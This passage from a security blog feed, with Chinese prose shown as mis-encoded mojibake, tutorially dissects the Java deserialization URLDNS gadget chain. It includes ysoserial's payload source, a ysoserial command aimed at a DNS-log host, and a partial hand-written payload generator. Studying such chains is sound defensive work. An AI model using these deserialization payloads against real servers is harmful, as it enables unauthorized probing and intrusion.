href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">ysoserial_CommonsCollections1.java</a></li><li><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP</a></li><li><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(äºŒ)-æœ€å¥½ç”¨çš„CCé“¾</a></li><li><a href="https://blog.csdn.net/yaomingyang/article/details/78748130">javaä¸­MapåŠMap.Entryè¯¦è§£</a></li><li><a href="https://mechoy.github.io/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">JavaåŠ¨æ€ä»£ç†</a></li><li><a href="https://commons.apache.org/proper/commons-collections/">CommonsCollectionså®˜æ–¹æ–‡æ¡£</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–</title>
    <link href="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="Javaå®‰å…¨-ååºåˆ—åŒ–"><a href="#Javaå®‰å…¨-ååºåˆ—åŒ–" class="headerlink" title="Javaå®‰å…¨-ååºåˆ—åŒ–"></a>Javaå®‰å…¨-ååºåˆ—åŒ–</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>æœ¬ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å­¦ä¹ Javaååºåˆ—åŒ–</p><h3 id="0x01-ååºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜äº§ç”Ÿ"><a href="#0x01-ååºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜äº§ç”Ÿ" class="headerlink" title="0x01 ååºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜äº§ç”Ÿ"></a>0x01 ååºåˆ—åŒ–çš„å®‰å…¨é—®é¢˜äº§ç”Ÿ</h3><p>ååºåˆ—åŒ–æ­£å¸¸æ¥è¯´ï¼Œæ˜¯ä¸å­˜åœ¨å®‰å…¨é—®é¢˜çš„ï¼Œä½†å½“è¢«ååºåˆ—åŒ–çš„ç±»(å®é™…ä¸Šæ˜¯è¯¥ç±»å¯¹è±¡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²)é‡å†™äº†<code>readObject()</code>æ—¶ï¼Œåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¼š**è‡ªåŠ¨æ‰§è¡Œé‡å†™åçš„<code>readObject()</code>**ï¼Œæ­¤æ—¶å°±å­˜åœ¨äº†ä¸€å®šçš„å®‰å…¨éšæ‚£ã€‚</p><p>ååºåˆ—æœºåˆ¶å¼•å…¥äº†åœ¨æœåŠ¡ç«¯æ‰§è¡Œä»£ç çš„å¯èƒ½ã€‚</p><h3 id="0x02-ååºåˆ—åŒ–å¯èƒ½çš„åˆ©ç”¨æ–¹å¼"><a href="#0x02-ååºåˆ—åŒ–å¯èƒ½çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x02 ååºåˆ—åŒ–å¯èƒ½çš„åˆ©ç”¨æ–¹å¼"></a>0x02 ååºåˆ—åŒ–å¯èƒ½çš„åˆ©ç”¨æ–¹å¼</h3><h4 id="æ–¹å¼ä¸€"><a href="#æ–¹å¼ä¸€" class="headerlink" title="æ–¹å¼ä¸€"></a>æ–¹å¼ä¸€</h4><p><strong>å…¥å£ç±»çš„<code>readObject()</code>ä¸­ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•ã€‚</strong></p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p><p>é‡å†™çš„<code>readObject()</code>ä¸­å­˜åœ¨å±é™©æ–¹æ³•ï¼Œä½†æ­¤ç±»æƒ…å†µä¸€èˆ¬ä¸å­˜åœ¨ï¼Œæ‰€ä»¥çœ‹çœ‹å°±å¥½ï¼ŒçŸ¥é“é‡å†™<code>readObject()</code></p><h4 id="æ–¹å¼äºŒ"><a href="#æ–¹å¼äºŒ" class="headerlink" title="æ–¹å¼äºŒ"></a>æ–¹å¼äºŒ</h4><p><strong>å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼Œ<code>readObject()</code>æ—¶è°ƒç”¨</strong></p><p>æ­¤ç±»æƒ…å†µï¼ŒURLDNSé“¾åº”è¯¥èƒ½å¤Ÿå¾ˆæ¸…æ¥šçš„è¿›è¡Œä¸€ä¸ªè¯´æ˜</p><p>ç®€ç­”æè¿°ä¸‹URLDNSé“¾ï¼Œå¾ˆéš¾é€ æˆå±å®³ï¼Œä½†ç”¨äºéªŒè¯ååºåˆ—åŒ–æ¼æ´æ˜¯éå¸¸å¥½ç”¨çš„ï¼Œè¯¥<code>gadget chains</code>(åˆ©ç”¨é“¾)ä½¿ç”¨çš„å…¨æ˜¯JDKåŸç”Ÿçš„ä¸œè¥¿ï¼Œä¸éœ€è¦å¼•å…¥å…¶ä»–çš„åŒ…ï¼Œæ•…è¯¥é“¾ç”¨äºéªŒè¯ååºåˆ—åŒ–æ¼æ´ç¡®å®ä¸é”™ã€‚</p><p>æ­¤å¤„å…ˆæä¸€ä¸‹è¿™ä¸ªå·¥å…·<a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>ï¼ŒYYDS</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹<code>ysoserial</code>ç»™å‡ºçš„URLDNSé“¾çš„<code>paylaod</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ æ‰äº†ä¸€äº›æ³¨é‡Š</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>        <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>        URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>        HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>        URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>        ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>        Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.åˆ©ç”¨åå°„æ›´æ”¹hashCodeçš„å€¼</span><br><br>        <span class="hljs-keyword">return</span> ht;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        PayloadRunner.run(URLDNS.class, args);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>    <span class="hljs-comment">// å®šä¹‰SilentURLStreamHandlerç»§æ‰¿URLStreamHandlerï¼Œè§£å†³äº†URLåœ¨åˆå§‹åŒ–æ—¶å‘èµ·çš„DNSè¯·æ±‚</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆç®€å•å¤ç°ä¸€ä¸‹ï¼Œæœ‰ç‚¹æˆå°±æ„Ÿåæ‰èƒ½æ›´æ·±å…¥çš„å­¦ä¹ ğŸƒ</p><p>æ‰¾ä¸ªDNSåœ¨çº¿å¹³å°</p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p><p><code>java -jar ysoserial.jar URLDNS &quot;http://spd8w49k8gy7.f43bc91d.dns.1433.eu.org.&quot; &gt; ser.bin</code></p><p>ç„¶åæŠŠå®ƒååºåˆ—åŒ–ä¸‹</p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p><p>æ”¶åˆ°DNSè¯·æ±‚ï¼Œå®Œå·¥ã€å…³æœºã€ä¸‹ç­ğŸ˜’</p><p>è¿™é‡Œæ”¶åˆ°äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œæ˜¯åªä¼šè¿›è¡Œä¸€æ¬¡DNSè¯·æ±‚çš„ï¼Œå¦ä¸€æ¬¡è·Ÿæˆ‘ä»¬å…³ç³»ä¸å¤§ï¼Œå¿½ç•¥â€¦</p><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯åºåˆ—åŒ–çš„æ—¶å€™ä¸€æ¬¡ï¼Œååºåˆ—åŒ–çš„æ—¶å€™åˆä¸€æ¬¡ï¼Œåé¢å‘ç°ä¸å¯¹åŠ²ï¼Œè‰¹äº†ï¼Œä¸å¥½å¥½çœ‹æºç çš„ä»£ä»·ğŸ™ƒ</p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p><p>ç®€ç®€å•å•ï¼Œçœ‹æ‡‚äº†çš„è¯ï¼Œæ²¡çœ‹æ‡‚çš„è¯è¿˜æ˜¯æœ‰äº›è¿·ç³Š</p><p>åå‘æ€è€ƒä¸€ä¸‹ï¼Œä½œè€…æ˜¯å¦‚ä½•æ‰¾åˆ°è¿™æ¡åˆ©ç”¨é“¾çš„ï¼š</p><ol><li>å…¥å£ç±»éœ€è¦é‡å†™äº†<code>readObject()</code></li><li>å…¥å£ç±»æ¥æ”¶çš„å‚æ•°å¹¿æ³›ï¼Œä¾‹å¦‚<code>Object</code></li><li>è¯¥å‚æ•°åœ¨<code>readObject()</code>ä¸­è¢«è°ƒç”¨ï¼Œå¹¶ä¸”è°ƒç”¨äº†è¯¥å‚æ•°çš„å±é™©æ–¹æ³•æˆ–é—´æ¥çš„è°ƒç”¨äº†è¯¥å‚æ•°çš„å±é™©æ–¹æ³•</li><li>å±é™©æ–¹æ³•èƒ½å¤Ÿé€ æˆä¸€å®šçš„å½±å“</li></ol><p>OKï¼Œè·Ÿç€ä¸Šé¢çš„ä»£ç æ¥ï¼Œç›´æ¥æ¥åˆ°<code>HashMap</code>çš„<code>readObject()</code></p><p>å…ˆèµ°ä¸€ä¸‹æ­£å¸¸çš„<code>HashMap#readObject()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¸€ä¸ªæ­£å¸¸çš„HashMap</span><br>HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>hashMap.put(<span class="hljs-string">&quot;zzz&quot;</span>,<span class="hljs-number">111</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br><br>    ObjectInputStream.GetField fields = s.readFields();<br><br>    <span class="hljs-comment">// Read loadFactor (ignore threshold)</span><br>    <span class="hljs-keyword">float</span> lf = fields.get(<span class="hljs-string">&quot;loadFactor&quot;</span>, <span class="hljs-number">0.75f</span>);<br>    <span class="hljs-keyword">if</span> (lf &lt;= <span class="hljs-number">0</span> || Float.isNaN(lf))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> + lf);<br><br>    lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, lf), <span class="hljs-number">4.0f</span>);<br>    HashMap.UnsafeHolder.putLoadFactor(<span class="hljs-keyword">this</span>, lf);<br><br>    reinitialize();<br><br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> + mappings);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// use defaults</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>        <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>        table = tab;<br><span class="hljs-comment">// ä¸Šé¢çš„å…¶å®æ²¡å•¥çœ‹çš„ï¼Œä¸æ˜¯éªŒè¯ï¼Œå°±æ˜¯è¯»å–ä¸€äº›å¿…è¦çš„å­—æ®µ</span><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<span class="hljs-comment">// å¼€å§‹é€ä¸ªåºåˆ—åŒ–keyå’Œvalue</span><br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>ã€ã€<br>            K key = (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            V value = (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<span class="hljs-comment">// æ­¤æ—¶è®¡ç®—äº†keyçš„hashCode</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>hash()</code>æ–¹æ³•ï¼Œæ³¨æ„æ­¤æ—¶ä¼ å…¥çš„keyï¼Œå·²çŸ¥ä¼ å…¥çš„keyæ˜¯ä¸€ä¸ªStringç±»å‹</p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<span class="hljs-comment">// æ¥æ”¶keyï¼Œä½œä¸ºObjectç±»å‹</span><br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<span class="hljs-comment">// è°ƒç”¨keyçš„hashCode()</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶<code>key</code>å®é™…ä¸Šæ˜¯<code>String</code>ç±»å‹ï¼Œè·Ÿè¿›<code>key.hashCode()</code>ï¼Œæ¥åˆ°<code>String#hashCode()</code></p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p><p>Okï¼Œå‡å¦‚ï¼Œæ­¤æ—¶çš„keyæ—¶URLç±»å‹çš„ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨åˆ°<code>URL#readObject()</code>ï¼Œå†æ¥çœ‹<code>URL#readObject()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<span class="hljs-comment">// å·²çŸ¥åœ¨new URLæ—¶ï¼ŒURLçš„hashCode=-1ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„åœ¨ååºåˆ—åŒ–æ—¶ä¼šæ›´æ”¹hashCode</span><br>        <span class="hljs-keyword">return</span> hashCode;<span class="hljs-comment">// åŸå› æ˜¯éœ€è¦ä¿è¯keyçš„å”¯ä¸€æ€§</span><br><br>    hashCode = handler.hashCode(<span class="hljs-keyword">this</span>);<span class="hljs-comment">// </span><br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆè°ƒç”¨<code>java.net.URLStreamHandler#hashCode()</code>ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Generate the protocol part.</span><br>    String protocol = u.getProtocol();<span class="hljs-comment">// è·å–è¯·æ±‚åè®®</span><br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-keyword">null</span>)<br>        h += protocol.hashCode();<br><br>    <span class="hljs-comment">// Generate the host part.</span><br>    InetAddress addr = getHostAddress(u);<span class="hljs-comment">// æ ¹äºåŸŸåè·å–IPåœ°å€ï¼Œä¹Ÿå°±æ˜¯å‘èµ·ä¸€æ¬¡DNSè¯·æ±‚ï¼Œä¸‹é¢çš„å°±å¯ä»¥å¿½ç•¥äº†</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>OKï¼Œåˆ°è¿™é‡Œå…¶å®å·²ç»æ¯”è¾ƒæ¸…æ™°äº†ï¼Œå¦‚æœ<code>hashMap()</code>çš„<code>key</code>æ˜¯ä¸€ä¸ªURLå¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡çš„<code>hashCode</code>å­—æ®µä¸º-1,åˆ™ä¼šå‘èµ·ä¸€æ¬¡DNSè¯·æ±‚ã€‚æ¥æ‹ä¸€æ‹</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Gadget Chain:<br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><span class="hljs-comment">// ä¸ªäººæ„Ÿè§‰è¿™ä¸ªç®—ä¸ä¸Šåˆ©ç”¨é“¾ä¸­çš„ä¸€æ¡ï¼Œå› ä¸ºåœ¨è°ƒç”¨è¯¥æ–¹æ³•ä¹‹å‰å·²ç»è°ƒç”¨äº†hash()èœé¸¡æƒ³æ³•ï¼Œè½»ç‚¹å–·</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><span class="hljs-comment">// éœ€ä¿è¯URLçš„hashCodeå­—æ®µä¸º-1æ‰èƒ½è¿›ä¸‹ä¸€æ­¥</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>hash<span class="hljs-constructor">Code()</span><span class="hljs-comment">// æ­¤å¤„è°ƒç”¨URLStreamHandler.getHostAddresså‘é€DNSè¯·æ±‚</span><br></code></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹ä¸€ä¸‹åœ¨åºåˆ—åŒ–ä¹‹åURLçš„<code>hashCode</code>å­—æ®µçš„å€¼</p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p><p>ä¸ºå•¥å‘¢ï¼Œå› ä¸ºåœ¨<code>put()</code>æ—¶ï¼Œè°ƒç”¨äº†<code>URL.hashCode()</code>å¯¹å…¶<code>hashCode</code>çš„å€¼è¿›è¡Œäº†è®¡ç®—</p><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p>åˆ°æ­¤ï¼Œç®—æ˜¯åŸºæœ¬å®Œå·¥ï¼Œå¯ä»¥æ ¹æ®ä¸Šé¢çš„æ¥å†™ä»£ç äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br><br>    <span class="hljs-comment">// å€Ÿç”¨ä¸€ç‚¹ysoserialçš„ä»£ç ï¼Œé˜²æ­¢åœ¨putæ—¶é€ æˆå½±å“</span><br>    SilentURLStreamHandler silentURLStreamHandler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br>    <span class="hljs-comment">// ä¸é‡æ–°å®šä¹‰URLStreamHandlerç±»ä¸­çš„openConnection()å’ŒInetAddress()æ–¹æ³•æ—¶ï¼Œå¯èƒ½ä¼šå¯¹æµ‹è¯•ç»“æœé€ æˆå½±å“</span><br>    <span class="hljs-comment">// åŸå› æ˜¯åœ¨è§£æDNSè¯·æ±‚æ—¶ï¼Œèƒ½ä¼šæœ‰ç¼“å­˜ï¼Œé€ æˆç¬¬äºŒæ¬¡è¯·æ±‚ä¼šä¼˜å…ˆä»ç¼“å­˜ä¸­å–å‡º</span><br>        <br>    HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>,<span class="hljs-string">&quot;http://dnslog.xxx&quot;</span>,silentURLStreamHandler);<span class="hljs-comment">// å¡«dnslogæœåŠ¡åœ°å€</span><br>    ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;C:\\Users\\53433\\Desktop\\tools\\ysoserial\\ser.bin&quot;</span>));<br>    hashMap.put(url,<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// ä½¿ç”¨åå°„æ›´æ”¹hashCodeçš„å€¼</span><br>    